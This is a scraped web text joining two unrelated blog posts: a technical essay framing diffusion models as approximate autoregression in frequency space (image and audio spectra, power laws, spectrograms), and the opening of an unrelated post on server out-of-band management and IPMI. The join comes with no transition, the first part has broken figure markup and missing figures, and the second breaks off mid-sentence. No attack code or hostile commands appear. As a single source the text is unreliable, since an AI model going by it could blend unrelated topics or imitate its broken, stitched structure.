<p>Because this underlying iterative approach is common to both paradigms, people have often sought to connect the two. One could frame autoregression as a special case of discrete diffusion, for example, with a corruption process that gradually replaces tokens by “mask tokens” from right to left, eventually ending up with a fully masked sequence. In the next few sections, we will do the opposite, framing diffusion as a special case of autoregression, albeit approximate.</p>

<p>Today, most language models are autoregressive, while most models of images and video are diffusion-based. In many other application domains (e.g. protein design, planning in reinforcement learning, …), diffusion models are also becoming more prevalent. I think this dichotomy, which can be summarised as “autoregression for language, and diffusion for everything else”, is quite interesting. I have <a href="https://sander.ai/2023/01/09/diffusion-language.html">written about it before</a>, and I will have more to say about it in a later section of this post.</p>

<h2 id="-a-spectral-view-of-diffusion"><a name="spectral-view"></a> A spectral view of diffusion</h2>

<h3 id="-image-spectra"><a name="image-spectra"></a> Image spectra</h3>

<p>When diffusion models rose to prominence for image generation, people noticed quite quickly that they tend to produce images in a coarse-to-fine manner. The large-scale structure present in the image seems to be decided in earlier denoising steps, whereas later denoising steps add more and more fine-grained details.</p>

<p>To formalise this observation, we can use signal processing, and more specifically <strong>spectral analysis</strong>. By decomposing an image into its constituent <strong>spatial frequency</strong> components, we can more precisely tease apart its coarse- and fine-grained structure, which correspond to low and high frequencies respectively.</p>

<p>We can use the 2D <a href="https://en.wikipedia.org/wiki/Fourier_transform">Fourier transform</a> to obtain a frequency representation of an image. This representation is invertible, i.e. it contains the same information as the pixel representation – it is just organised in a different way. Like the pixel representation, it is a 2D grid-structured object, with the same width and height as the original image, but the axes now correspond to horizontal and vertical spatial frequencies, rather than spatial positions.</p>

<p>To see what this looks like, let’s take some images and visualise their spectra.</p>

<figure>
  <a href="https://sander.ai/images/plot_image_spectra.png"><img src="https://sander.ai/images/plot_image_spectra.png" alt="Four images from the Imagenette dataset (top), along with their magnitude spectra (middle) and their phase spectra (bottom)."></a>
  <figcaption>Four images from the <a href="https://github.com/fastai/imagenette">Imagenette dataset</a> (top), along with their magnitude spectra (middle) and their phase spectra (bottom).</figcaption>
</figure>

<p>Shown above on the first row are four images from the <a href="https://github.com/fastai/imagenette">Imagenette dataset</a>, a subset of the ImageNet dataset (I picked it because it is relatively fast to load).</p>

<p>The Fourier transform is typically complex-valued, so the next two rows visualise the <em>magnitude</em> and the <em>phase</em> of the spectrum respectively. Because the magnitude varies greatly across different frequencies, its logarithm is shown. The phase is an angle, which varies between \(-\pi\) and \(\pi\). Note that we only calculate the spectrum for the green colour channel – we could calculate it for the other two channels as well, but they would look very similar.</p>

<p>The centre of the spectrum corresponds to the lowest spatial frequencies, and the frequencies increase as we move outward to the edges. This allows us to see where most of the energy in the input signal is concentrated. Note that by default, it is the other way around (low frequencies in the corner, high frequencies in the middle), but <code>np.fft.fftshift</code> allows us to swap these, which yields a much nicer looking visualisation that makes the structure of the spectrum more apparent.</p>

<p>A lot of interesting things can be said about the phase structure of natural images, but in what follows, we will primarily focus on the magnitude spectrum. The square of the magnitude is the <em>power</em>, so in practice we often look at the <em>power spectrum</em> instead. Note that the logarithm of the power spectrum is simply that of the magnitude spectrum, multiplied by two.</p>

<p>Looking at the spectra, we now have a more formal way to reason about different feature scales in images, but that still doesn’t explain why diffusion models exhibit this coarse-to-fine behaviour. To see why this happens, we need to examine what a typical image spectrum looks like. To do this, we will <strong>make abstraction of the directional nature of frequencies in 2D space</strong>, simply by slicing the spectrum along a certain angle, rotating that slice all around, and then averaging the slices across all rotations. This yields a one-dimensional curve: <strong>the <em>radially averaged power spectral density</em>, or RAPSD</strong>.</p>

<p>Below is an animation that shows individual directional slices of the 2D spectrum on a log-log plot, which are averaged to obtain the RAPSD.</p>

<figure>
  <a href="https://sander.ai/images/image_spectrum.gif"><img src="https://sander.ai/images/image_spectrum.gif" alt="Animation that shows individual directional slices of the 2D spectrum of an image on a log-log plot."></a>
  <figcaption>Animation that shows individual directional slices of the 2D spectrum of an image on a log-log plot.</figcaption>
</figure>

<p>Let’s see what that looks like for the four images above. We will use the <code>pysteps</code> library, which comes with a handy function to calculate the RAPSD in one go.</p>

<figure>
  <a href="https://sander.ai/images/plot_image_rapsd.png"><img src="https://sander.ai/images/plot_image_rapsd.png" alt="Four images from the Imagenette dataset (top), along with their radially averaged spectral power densities (RAPSDs, bottom)."></a>
  <figcaption>Four images from the Imagenette dataset (top), along with their radially averaged spectral power densities (RAPSDs, bottom).</figcaption>
</figure>

<p>The RAPSD is best visualised on a log-log plot, to account for the large variation in scale. We chop off the so-called DC component (with frequency 0) to avoid taking the logarithm of 0.</p>

<p>Another thing this visualisation makes apparent is that the curves are remarkably close to being straight lines. A straight line on a log-log plot implies that there might be a power law lurking behind all of this.</p>

<p>Indeed, this turns out to be the case: <strong>natural image spectra tend to approximately follow a power law</strong>, which means that the power \(P(f)\) of a particular frequency \(f\) is proportional to \(f^{-\alpha}\), where \(\alpha\) is a parameter<sup id="fnref:schaaf" role="doc-noteref"><a href="#fn:schaaf" rel="footnote">1</a></sup> <sup id="fnref:torralba" role="doc-noteref"><a href="#fn:torralba" rel="footnote">2</a></sup> <sup id="fnref:hyvarinen" role="doc-noteref"><a href="#fn:hyvarinen" rel="footnote">3</a></sup>. In practice, \(\alpha\) is often remarkably close to 2 (which corresponds to the spectrum of <a href="https://en.wikipedia.org/wiki/Pink_noise">pink noise</a> in two dimensions).</p>

<p>We can get closer to the “typical” RAPSD by taking the average across a bunch of images (in the log-domain).</p>

<figure>
  <a href="https://sander.ai/images/mean_log_rapsd.png"><img src="https://sander.ai/images/mean_log_rapsd.png" alt="The average of RAPSDs of a set of images in the log-domain."></a>
  <figcaption>The average of RAPSDs of a set of images in the log-domain.</figcaption>
</figure>

<p>As I’m sure you will agree, that is pretty unequivocally a power law!</p>

<p>To estimate the exponent \(\alpha\), we can simply use linear regression in log-log space. Before proceeding however, it is useful to resample our averaged RAPSD so the sample points are linearly spaced in log-log space – otherwise our fit will be dominated by the high frequencies, where we have many more sample points.</p>

<p>We obtain an estimate \(\hat{\alpha} = 2.454\), which is a bit higher than the typical value of 2. As far as I understand, this can be explained by the presence of man-made objects in many of the images we used, because they tend to have smooth surfaces and straight angles, which results in comparatively more low-frequency content and less high-frequency content compared to images of nature. Let’s see what our fit looks like.</p>

<h3 id="-noisy-image-spectra"><a name="noisy-spectra"></a> Noisy image spectra</h3>

<p>A crucial aspect of diffusion models is the corruption process, which involves adding Gaussian noise. Let’s see what this does to the spectrum. The first question to ask is: what does the spectrum of noise look like? We can repeat the previous procedure, but replace the image input with standard Gaussian noise. For contrast, we will visualise the spectrum of the noise alongside that of the images from before.</p>

<figure>
  <a href="https://sander.ai/images/mean_log_rapsd_noise.png"><img src="https://sander.ai/images/mean_log_rapsd_noise.png" alt="The average of RAPSDs of a set of images in the log-domain (red line), along with the average of RAPSDs of standard Gaussian noise (blue line)."></a>
  <figcaption>The average of RAPSDs of a set of images in the log-domain (red line), along with the average of RAPSDs of standard Gaussian noise (blue line).</figcaption>
</figure>

<p>The RAPSD of Gaussian noise is also a straight line on a log-log plot; but a horizontal one, rather than one that slopes down. This reflects the fact that <strong>Gaussian noise contains all frequencies in equal measure</strong>. The Fourier transform of Gaussian noise is itself Gaussian noise, so its power must be equal across all frequencies in expectation.</p>

<p>When we add noise to the images and look at the spectrum of the resulting noisy images, we see a hinge shape:</p>

<figure>
  <a href="https://sander.ai/images/mean_log_rapsd_sum.png"><img src="https://sander.ai/images/mean_log_rapsd_sum.png" alt="The average of RAPSDs of a set of images in the log-domain (red line), along with the average of RAPSDs of standard Gaussian noise (blue line) and the average of RAPSDs of their sum (green line)."></a>
  <figcaption>The average of RAPSDs of a set of images in the log-domain (red line), along with the average of RAPSDs of standard Gaussian noise (blue line) and the average of RAPSDs of their sum (green line).</figcaption>
</figure>

<p>Why does this happen? Recall that the <strong>Fourier transform is linear</strong>: the Fourier transform of the sum of two things, is the sum of the Fourier transforms of those things. Because the power of the different frequencies varies across orders of magnitude, <strong>one of the terms in this sum tends to drown out the other</strong>. This is what happens at low frequencies, where the image spectrum dominates, and hence the green curve overlaps with the red curve. At high frequencies on the other hand, the noise spectrum dominates, and the green curve overlaps with the blue curve. In between, there is a transition zone where the power of both spectra is roughly matched.</p>

<p>If we increase the variance of the noise by scaling the noise term, we increase its power, and as a result, its RAPSD will shift upward (which is also a consequence of the linearity of the Fourier transform). This means a smaller part of the image spectrum now juts out above the waterline: <strong>the increasing power of the noise looks like the rising tide!</strong></p>

</figure>

<p>At this point, I’d like to revisit a diagram from the <a href="https://sander.ai/2023/07/20/perspectives.html#autoregressive">perspectives on diffusion blog post</a>, where I originally drew the connection between diffusion and autoregression in frequency space, which is shown below.</p>

  <figcaption>Magnitude spectra of natural images, Gaussian noise, and noisy images.</figcaption>
</figure>

<p>These idealised plots of the spectra of images, noise, and their superposition match up pretty well with the real versions. When I originally drew this, I didn’t actually realise just how closely this reflects reality!</p>

<p>What these plots reveal is an approximate equivalence (in expectation) between adding noise to images, and <strong>low-pass filtering</strong> them. The noise will drown out some portion of the high frequencies, and leave the low frequencies untouched. The variance of the noise determines the <strong>cut-off frequency</strong> of the filter. Note that this is the case only because of the characteristic shape of natural image spectra.</p>

<p>The animation below shows how the spectrum changes as we gradually add more noise, until it eventually overpowers all frequency components, and all image content is gone.</p>

<h3 id="-diffusion"><a name="diffuion"></a> Diffusion</h3>

<p>With this in mind, it becomes apparent that the corruption process used in diffusion models is actually gradually filtering out more and more high-frequency information from the input image, and the different time steps of the process correspond to a frequency decomposition: basically an approximate version of the <strong>Fourier transform</strong>!</p>

<p>Since diffusion models themselves are tasked with reversing this corruption process step-by-step, they end up roughly predicting the next higher frequency component at each step of the generative process, given all preceding (lower) frequency components. This is a soft version of <strong>autoregression in frequency space</strong>, or if you want to make it sound fancier, <strong>approximate spectral autoregression</strong>.</p>

<p>To the best of my knowledge, <a href="https://arxiv.org/abs/2206.13397">Rissanen et al. (2022)</a><sup id="fnref:heat" role="doc-noteref"><a href="#fn:heat" rel="footnote">4</a></sup> were the first to apply this kind of analysis to diffusion in the context of generative modelling (see §2.2 in the paper). Their work directly inspired this blog post.</p>

<p>In many popular formulations of diffusion, the corruption process does not just involve adding noise, but also rescaling the input to keep the total variance within a reasonable range (or constant, in the case of variance-preserving diffusion). I have largely ignored this so far, because it doesn’t materially change anything about the intuitive interpretation. Scaling the input simply results in the RAPSD shifting up or down a bit.</p>

<h3 id="-which-frequencies-are-modelled-at-which-noise-levels"><a name="quantitative"></a> Which frequencies are modelled at which noise levels?</h3>

<p>There seems to be a monotonic relationship between noise levels and spatial frequencies (and hence feature scales). Can we characterise this quantitatively?</p>

<p>We can try, but it is important to emphasise that this relationship is only really valid in expectation, averaged across many images: <strong>for individual images, the spectrum will not be a perfectly straight line, and it will not typically be monotonically decreasing</strong>.</p>

<p>Even if we ignore all that, the “elbow” of the hinge-shaped spectrum of a noisy image is not very sharp, so it is clear that there is quite a large transition zone where we cannot unequivocally say that a particular frequency is dominated by either signal or noise. So this is, at best, a very smooth approximation to the “hard” autoregression used in e.g. large language models.</p>

<p>Keeping all of that in mind, let us construct a mapping from noise levels to frequencies for a particular diffusion process and a particular image distribution, by choosing a signal-to-noise ratio (SNR) threshold, below which we will consider the signal to be undetectable. This choice is quite arbitrary, and we will just have to choose a value and stick with it. We can choose 1 to keep things simple, which means that we consider the signal to be detectable if its power is equal to or greater than the power of the noise.</p>

<p>Consider a Gaussian diffusion process for which \(\mathbf{x}_t = \alpha(t)\mathbf{x}_0 + \sigma(t) \mathbf{\varepsilon}\), with \(\mathbf{x}_0\) an example from the data distribution, and \(\mathbf{\varepsilon}\) standard Gaussian noise.</p>

<p>Let us define \(\mathcal{R}[\mathbf{x}](f)\) as the RAPSD of an image \(\mathbf{x}\) evaluated at frequency \(f\). We will call the SNR threshold \(\tau\). If we consider a particular time step \(t\), then assuming the RAPSD is monotonically decreasing, we can define the <strong>maximal detectable frequency</strong> \(f_\max\) at this time step in the process as the maximal value of \(f\) for which:</p><p>

\[\mathcal{R}[\alpha(t)\mathbf{x}_0](f) &gt; \tau \cdot \mathcal{R}[\sigma(t)\mathbf{\varepsilon}](f).\]

</p><p>Recall that the Fourier transform is a linear operator, and \(\mathcal{R}\) is a radial average of the square of its magnitude. Therefore, scaling the input to \(\mathcal{R}\) by a real value means the output gets scaled by its square. We can use this to simplify things:</p><p>

\[\mathcal{R}[\mathbf{x}_0](f) &gt; \tau \cdot \frac{\sigma(t)^2}{\alpha(t)^2} \mathcal{R}[\mathbf{\varepsilon}](f).\]

</p><p>We can further simplify this by noting that \(\forall f: \mathcal{R}[\mathbf{\varepsilon}](f) = 1\):</p><p>

\[\mathcal{R}[\mathbf{x}_0](f) &gt; \tau \cdot \frac{\sigma(t)^2}{\alpha(t)^2}.\]

</p><p>To construct such a mapping in practice, we first have to choose a diffusion process, which gives us the functional form of \(\sigma(t)\) and \(\alpha(t)\). To keep things simple, we can use the rectified flow<sup id="fnref:rectifiedflow" role="doc-noteref"><a href="#fn:rectifiedflow" rel="footnote">5</a></sup> / flow matching<sup id="fnref:flowmatching" role="doc-noteref"><a href="#fn:flowmatching" rel="footnote">6</a></sup> process, as used in Stable Diffusion 3<sup id="fnref:sd3" role="doc-noteref"><a href="#fn:sd3" rel="footnote">7</a></sup>, for which \(\sigma(t) = t\) and \(\alpha(t) = 1 - t\). Combined with \(\tau = 1\), this yields:</p><p>

\[\mathcal{R}[\mathbf{x}_0](f) &gt; \left(\frac{t}{1 - t}\right)^2.\]

</p><p>With these choices, we can now determine the shape of \(f_\max(t)\) and visualise it.</p>

</figure>

<p>The frequencies here are relative: if the bandwidth of the signal is 1, then 0.5 corresponds to the <a href="https://en.wikipedia.org/wiki/Nyquist_frequency">Nyquist frequency</a>, i.e. the maximal frequency that is representable with the given bandwidth.</p>

<p>Note that all representable frequencies are detectable at time steps near 0. As \(t\) increases, so does the noise level, and hence \(f_\max\) starts dropping, until it eventually reaches 0 (no detectable signal frequencies are left) close to \(t = 1\).</p>

<p>All of the analysis above hinges on the fact that spectra of natural images typically follow a power law. Diffusion models have also been used to generate audio<sup id="fnref:wavegrad" role="doc-noteref"><a href="#fn:wavegrad" rel="footnote">8</a></sup> <sup id="fnref:diffwave" role="doc-noteref"><a href="#fn:diffwave" rel="footnote">9</a></sup>, which is the other main perceptual modality besides the visual. A very natural question to ask is whether the same interpretation makes sense in the audio domain as well.</p>

<p>To establish that, we will grab a dataset of typical audio recordings that we might want to build a generative model of: speech and music.</p>

</figure>

<p>Along with each audio player, a <em>spectrogram</em> is shown: this is a time-frequency representation of the sound, which is obtained by applying the Fourier transform to short overlapping windows of the waveform and stacking the resulting magnitude vectors together in a 2D matrix.</p>

<p>For the purpose of comparing the spectrum of sound with that of images, we will use the 1-dimensional analogue of the RAPSD, which is simply the squared magnitude of the 1D Fourier transform.</p>

<figure>

  <figcaption>Magnitude spectra of four audio clips from the <a href="https://www.kaggle.com/datasets/lnicalo/gtzan-musicspeech-collection">GTZAN music/speech dataset</a>.</figcaption>
</figure>

<p>These are a lot noisier than the image spectra, which is not surprising as these are not averaged over directions, like the RAPSD is. But aside from that, they don’t really look like straight lines either – the power law shape is nowhere to be seen!</p>

<p>I won’t speculate about why images exhibit this behaviour and sound seemingly doesn’t, but it is certainly interesting (feel free to speculate away in the comments!). To get a cleaner view, we can again average the spectra of many clips in the log domain, as we did with the RAPSDs of images.</p>

<figure>

  <figcaption>The average of magnitude spectra of a set of audio clips the log-domain.</figcaption>
</figure>

<p>Definitely not a power law. More importantly, it is not monotonic, so adding progressively more Gaussian noise to this does not obfuscate frequencies in descending order: <strong>the “diffusion is just spectral autoregression” meme does not apply to audio waveforms!</strong></p>

<p>The average spectrum of our dataset exhibits a peak around 300-400 Hz. This is not too far off the typical spectrum of <a href="https://en.wikipedia.org/wiki/Colors_of_noise#Green_noise">green noise</a>, which has more energy in the region of 500 Hz. Green noise is supposed to sound like “the background noise of the world”.</p>

<figure>
  <a href="https://sander.ai/images/rising_tide_sound.gif"><img src="https://sander.ai/images/rising_tide_sound.gif" alt="Animation that shows the changing averaged magnitude spectrum as more and more noise is added to a set of audio clips."></a>
  <figcaption>Animation that shows the changing averaged magnitude spectrum as more and more noise is added to a set of audio clips.</figcaption>
</figure>

<p>As the animation above shows, the different frequencies present in audio signals still get filtered out gradually from least powerful to most powerful, because the spectrum of Gaussian noise is still flat, just like in the image domain. But as the audio spectrum does not monotonically decay with increasing frequency, the order is not monotonic in terms of the frequencies themselves.</p>

<p>What does this mean for diffusion in the waveform domain? That’s not entirely clear to me. It certainly makes the link with autoregressive models weaker, but I’m not sure if there are any negative implications for generative modelling performance.</p>

<p>One observation that does perhaps indicate that this is the case, is that a lot of diffusion models of audio described in the literature <strong>do not operate directly in the waveform domain</strong>. It is quite common to first extract some form of spectrogram (as we did earlier), and perform diffusion in that space, essentially treating it like an image<sup id="fnref:hawthorne" role="doc-noteref"><a href="#fn:hawthorne" rel="footnote">10</a></sup> <sup id="fnref:riffusion" role="doc-noteref"><a href="#fn:riffusion" rel="footnote">11</a></sup> <sup id="fnref:edmsound" role="doc-noteref"><a href="#fn:edmsound" rel="footnote">12</a></sup>. Note that spectrograms are a somewhat lossy representation of sound, because <a href="https://sander.ai/2020/03/24/audio-generation.html#why-waveforms">phase information is typically discarded</a>.</p>

<p>To understand the implications of this for diffusion models, we will extract <strong>log-scaled mel-spectrograms</strong> from the sound clips we have used before. The <a href="https://en.wikipedia.org/wiki/Mel_scale">mel scale</a> is a nonlinear frequency scale which is intended to be perceptually uniform, and which is very commonly used in spectral analysis of sound.</p>

<p>Next, we will interpret these spectrograms as images and look at their spectra. Taking the spectrum of a spectrum might seem odd – some of you might even suggest that it is pointless, because the Fourier transform is its own inverse! But note that there are a few nonlinear operations happening in between: taking the magnitude (discarding the phase information), mel-binning and log-scaling. As a result, this second Fourier transform doesn’t just undo the first one.</p>

<p>It seems like the power law has resurfaced! We can look at the average in the log-domain again to get a smoother curve.</p>

</figure>

<p>I found this pretty surprising. I actually used to object quite strongly to the idea of treating spectrograms as images, as in this tweet in response to <a href="https://en.wikipedia.org/wiki/Riffusion">Riffusion</a>, a variant of Stable Diffusion finetuned on spectrograms:</p>

<blockquote><div lang="en" dir="ltr"><p>Me: "NOOO, you can't just treat spectrograms as images, the frequency and time axes have completely different semantics, there is no locality in frequency and ..."</p><p>These guys: "Stable diffusion go brrr" <a href="https://t.co/Akv8aZl8Rv">https://t.co/Akv8aZl8Rv</a></p></div>— Sander Dieleman (@sedielem) <a href="https://twitter.com/sedielem/status/1603412454427574279?ref_src=twsrc%5Etfw">December 15, 2022</a></blockquote>


<p>… but I have always had to concede that it seems to work pretty well in practice, and perhaps the fact that spectrograms exhibit power-law spectra is one reason why.</p>

<p>There is also an interesting link with <a href="https://en.wikipedia.org/wiki/Mel-frequency_cepstrum">mel-frequency cepstral coefficients (MFCCs)</a>, a popular feature representation for speech and music processing which predates the advent of deep learning. These features are constructed by taking the <a href="https://en.wikipedia.org/wiki/Discrete_cosine_transform">discrete cosine transform (DCT)</a> of a mel-spectrogram. The resulting spectrum-of-a-spectrum is often referred to as the <strong>cepstrum</strong>.</p>

<p>So with this approach, perhaps the meme applies to sound after all, albeit with a slight adjustment: <strong>diffusion on spectrograms is just cepstral autoregression</strong>.</p>

<h2 id="-unstable-equilibrium"><a name="unstable-equilibrium"></a> Unstable equilibrium</h2>

<figure>
  <a href="https://sander.ai/images/spinningtop.jpg"><img src="https://sander.ai/images/spinningtop.jpg"></a>
</figure>

<p>So far, we have talked about a spectral perspective on diffusion, but we have not really discussed how it can be used to explain why diffusion works so well for images. The fact that this interpretation is possible for images, but not for some other domains, does not automatically imply that the method should also work better.</p>

<p>However, it does mean that the diffusion loss, which is a weighted average across all noise levels, is also implicitly a weighted average over all spatial frequencies in the image domain. Being able to individually weight these frequencies in the loss according to their relative importance is key, because the sensitivity of the human visual system to particular frequencies varies greatly. <strong>This effectively makes the diffusion training objective a kind of perceptual loss</strong>, and I believe it largely explains the success of diffusion models in the visual domain (together with <a href="https://sander.ai/2023/08/28/geometry.html">classifier-free guidance</a>).</p>

<p>Going beyond images, one could use the same line of reasoning to try and understand why diffusion models <em>haven’t</em> really caught on in the domain of language modelling so far (I wrote more about this <a href="https://sander.ai/2023/01/09/diffusion-language.html">last year</a>). The interpretation in terms of a frequency decomposition is not really applicable there, and hence being able to change the relative weighting of noise levels in the loss doesn’t quite have the same impact on the quality of generated outputs.</p>

<p>For language modelling, autoregression is currently the dominant modelling paradigm, and while diffusion-based approaches have been making inroads recently<sup id="fnref:ratios" role="doc-noteref"><a href="#fn:ratios" rel="footnote">13</a></sup> <sup id="fnref:sahoo" role="doc-noteref"><a href="#fn:sahoo" rel="footnote">14</a></sup> <sup id="fnref:shi" role="doc-noteref"><a href="#fn:shi" rel="footnote">15</a></sup>, a full-on takeover does not look like it is in the cards in the short term.</p>

<p>This results in the following status quo: <strong>we use autoregression for language, and we use diffusion for pretty much everything else</strong>. Of course, I realise that I have just been arguing that these two approaches are not all that different in spirit. But in practice, their implementations can look quite different, and a lot of knowledge and experience that practitioners have built up is specific to each paradigm.</p>

<p>To me, this feels like an <strong>unstable equilibrium, because the future is multimodal</strong>. We will ultimately want models that natively understand language, images, sound and other modalities mixed together. Grafting these two different modelling paradigms together to construct multimodal models is effective to some extent, and certainly interesting from a research perspective, but it brings with it an increased level of complexity (i.e. having to master two different modelling paradigms) which I don’t believe practitioners will tolerate in the long run.</p>

<p>So in the longer term, it seems plausible that we could go back to using autoregression across all modalities, perhaps borrowing some ideas from diffusion in the process<sup id="fnref:var" role="doc-noteref"><a href="#fn:var" rel="footnote">16</a></sup> <sup id="fnref:arnovq" role="doc-noteref"><a href="#fn:arnovq" rel="footnote">17</a></sup>. Alternatively, we might figure out how to build multimodal diffusion models for all modalities, including language. I don’t know which it is going to be, but both of those outcomes ultimately seem more likely than the current situation persisting.</p>

<p>One might ask, if diffusion is really just approximate autoregression in frequency space, why not just do exact autoregression in frequency space instead, and maybe that will work just as well? That would mean we can use autoregression across all modalities, and resolve the “instability” in one go. <a href="https://arxiv.org/abs/2103.03841">Nash et al. (2021)</a><sup id="fnref:dctransformer" role="doc-noteref"><a href="#fn:dctransformer" rel="footnote">18</a></sup>, <a href="https://arxiv.org/abs/2404.02905">Tian et al. (2024)</a><sup id="fnref:var:1" role="doc-noteref"><a href="#fn:var" rel="footnote">16</a></sup> and <a href="https://arxiv.org/abs/2406.19997">Mattar et al. (2024)</a><sup id="fnref:wavelets" role="doc-noteref"><a href="#fn:wavelets" rel="footnote">19</a></sup> explore this direction.</p>

<p>There is a good reason not to take this shortcut, however: the diffusion sampling procedure is exceptionally flexible, in ways that autoregressive sampling is not. For example, the number of sampling steps can be chosen at test time (this isn’t impossible for autoregressive models, but it is much less straightforward to achieve). This flexibility also enables <a href="https://sander.ai/2024/02/28/paradox.html">various distillation methods</a> to reduce the number of steps required, and <a href="https://sander.ai/2023/08/28/geometry.html">classifier-free guidance</a> to improve sample quality. Before we do anything rash and ditch diffusion altogether, we will probably want to figure out a way to avoid having to give up some of these benefits.</p>

<p>When I first had a closer look at the spectra of real images myself, I realised that the link between diffusion models and autoregressive models is even stronger than I had originally thought – in the image domain, at least. This is ultimately why I decided to write this blog post in <a href="https://colab.research.google.com/drive/1siywvhvl1OxI1UmqRrJHiFUK0M5SHlcx">a notebook</a>, to make it easier for others to see this for themselves as well. More broadly speaking, I find that learning by “doing” has a much more lasting effect than learning by reading, and hopefully making this post interactive can help with that.</p>

<p>There are of course many other ways to connect the two modelling paradigms of diffusion and autoregression, which I won’t go into here, but it is becoming a rather popular topic of inquiry<sup id="fnref:rolling" role="doc-noteref"><a href="#fn:rolling" rel="footnote">20</a></sup> <sup id="fnref:fifo" role="doc-noteref"><a href="#fn:fifo" rel="footnote">21</a></sup> <sup id="fnref:forcing" role="doc-noteref"><a href="#fn:forcing" rel="footnote">22</a></sup>.</p>

<p>If you enjoyed this post, I strongly recommend also reading <a href="https://arxiv.org/abs/2206.13397">Rissanen et al. (2022)</a>’s paper on generative modelling with inverse heat dissipation<sup id="fnref:heat:1" role="doc-noteref"><a href="#fn:heat" rel="footnote">4</a></sup>, which inspired it.</p>

<p>This blog-post-in-a-notebook was an experiment, so any feedback on the format is very welcome! It’s a bit more work, but hopefully some readers will derive some benefit from it. If there are enough of you, perhaps I will do more of these in the future. <strong>Please share your thoughts in the comments!</strong></p>

<div id="readability-page-1" class="page"><article>


<p>I am making steady progress towards moving the <em>Computers Are Bad</em> enterprise
cloud to its new home, here in New Mexico. One of the steps in this process is,
of course, purchasing a new server... the current Big Iron is getting rather
old (probably about a decade!)  and here in town I'll have the rack space for
more machines anyway.</p>
<p>In our modern, cloud-centric industry, it is rare that I find myself comparing
the specifications of a Dell PowerEdge against an HP ProLiant. Because the
non-hyperscale server market has increasingly consolidated around Intel
specifications and reference designs, it is even rarer that there is much of a
difference between the major options.</p>
<p>This brings back to mind one of those ancient questions that comes up among
computer novices and becomes a writing prompt for technology bloggers. What
<em>is</em> a server? Is it just, like, a big computer? Or is it actually special?</p>
<p>There's a lot of industrial history wrapped up in that question, and the answer
is often very context-specific. But there are some generalizations we can make
about the history of the server: client-server computing originated mostly as
an evolution of time-sharing computing using multiple terminals connected to a
single computer. There was no expectation that terminals had a similar
architecture to computers (and indeed they were usually vastly simpler
machines), and that attitude carried over to client-server systems. The PC
revolution instilled a WinTel monoculture in much of client-side computing by
the mid-'90s, but it remained common into the '00s for servers to run entirely
different operating systems and architectures.</p>
<p>The SPARC and Solaris combination was very common for servers, as were IBM's
minicomputer architectures and their numerous operating systems. Indeed, one of
the key commercial contributions of Java was the way it allowed enterprise
applications to be written for a Solaris/SPARC backend while enabling code
reuse for clients that ran on either stalwarts like Unix/RISC or "modern"
business computing environments like Windows/x86. This model was sometimes
referred to as client-server computing with "thick clients." It preserved the
differentiation between "server" and "client" as classes of machines, and the
universal adherance of serious business software to this model lead to an
association between server platforms and "enterprise computing."</p>
<p>Over time, things have changed, as they always do. Architectures that had been
relegated to servers became increasingly niche and struggled to compete with
the PC architecture on cost and performance. The general architecture of server
software shifted away from vertical scaling and high-uptime systems to
horizontal scaling with relaxed reliability requirements, taking away much of
the advantage of enterprise-class computers. For the most part, today, a server
is just a big computer. There are some distinguishing features: servers are far
more likely to be SMP or NUMA, with multiple processor sockets. While the days
of SAS and hardware RAID are increasingly behind us, servers continue to have
more complex storage controllers and topologies than clients. And servers,
almost by definition, offer some sort of out of band management.</p>
<p>Out-of-band management, sometimes also called lights-out management, identifies
a capability that is almost unheard of in clients. A separate, smaller
management computer allows for remote access to a server even when it is, say,
powered off. The terms out-of-band and in-band in this context emerge from
their customery uses in networking and telecom, meaning that out of band
management is performed without the use of the standard (we might say "data
plane") network connection to a machine. But in practice they have drifted in
meaning, and it is probably better to think of out-of-band management as
meaning that the <em>operating system and general-purpose components are not
required.</em> This might be made clearer by comparison: a very standard example of
in-band management would be SSH, a service provided by the software on a
computer that allows you to interact with it. Out-of-band management, by
contrast, is provided by a dedicated hardware and software stack and does not
require the operating system or, traditionally, even the CPU to cooperate.</p>
<p>You can imagine that this is a useful capability. Today, out-of-band management
is probably best exemplified by the remote console that most servers offer.
It's basically an embedded IP KVM, allowing you to interact with the machine as
if you were at a locally connected monitor and keyboard. A lot of OOB
management products also offer "virtual media," where you can upload an ISO
file to the management interface and then have it appear to the computer proper
as if it were a physical device. This is extremely useful for installing
operating systems.</p>
<p>OOB management is an interesting little corner of computer history. It's not a
new idea at all; in fact, similar capabilities can be found through pretty much
the entire history of business computing. If anything, it's gotten simpler and
more boring over time. A few evenings ago I was watching a <a href="https://www.youtube.com/watch?v=J1NxcgasTIU">clabretro
video</a> about an IBM p5 he's gotten
working. As is the case in most of his videos about servers, he has to give a
brief explanation of the multiple layers of lower-level management systems
present in the p5 and their various textmode and web interfaces.</p>
<p>If we constrain our discussion of "servers" to relatively modern machines,
starting say in the late '80s or early '90s, there are some common features:</p>
<ul>
<li>Some sort of local operator interface (this term itself being a very old
one), like an LCD matrix display or grid of LED indicators, providing low-level
information on hardware health.</li>
<li>A serial console with access to the early bootloader and a persistent
low-level management system.</li>
<li>A higher-level management system, with a variable position in the stack
depending on architecture, for remote management of the machine workload.</li>
</ul>
<p>A lot of this stuff still hangs around today. Most servers can tell you on the
front panel if a redundant component like a fan or power supply has failed,
although the number of components that are redundant and can be replaced online
has dwindled with time from "everything up to and including CPUs" on '90s
prestige architectures to sometimes little more than fans. Serial management is
still pretty common, mostly as a holdover of being a popular way to do OS
installation and maintenance on headless machines [1].</p>
<p>But for the most part, OOB management has consolidated in the exact same way as
processor architecture: onto Intel IPMI.</p>
<p>IPMI is confusing to some people for a couple of reasons. First, IPMI is a
specification, not an implementation. Most major vendors have their own
implementation of IPMI, often with features above and beyond the core IPMI
spec, and they call them weird acronyms like HP iLO and Dell DRAC. These
vendor-specific implementations often predate IPMI, too, so it's never quite
right to say they are "just IPMI." They're independent systems with IPMI
characteristics. On the other hand, more upstart manufacturers are more likely
to just call it IPMI, in which case it may just be the standard offering from
their firmware vendor.</p>
<p>Further confusing matters is a fair amount of terminological overlap. The IPMI
software runs on a processor conventionally called the baseboard management
controller or BMC, and the terms IPMI and BMC are sometimes used
interchangeably. Lights-out management or LOM is mostly an obsolete term but
sticks around because HP(E) is a fan of it and continues to call their IPMI
implementation Integrated Lights-Out. The BMC should not be confused with the
System Management Controller or SMC, which is one of a few terms used for a
component present in client computers to handle tasks like fan speed control.
These have an interrelated history and, indeed, the BMC handles those functions
in most servers.</p>
<p>IPMI also specifies two interfaces: an out-of-band interface available over the
network or a serial connection, and an in-band interface available to the
operating system via a driver (and, in practice, I believe communication
between the CPU and the baseboard management controller via the low-pin-count
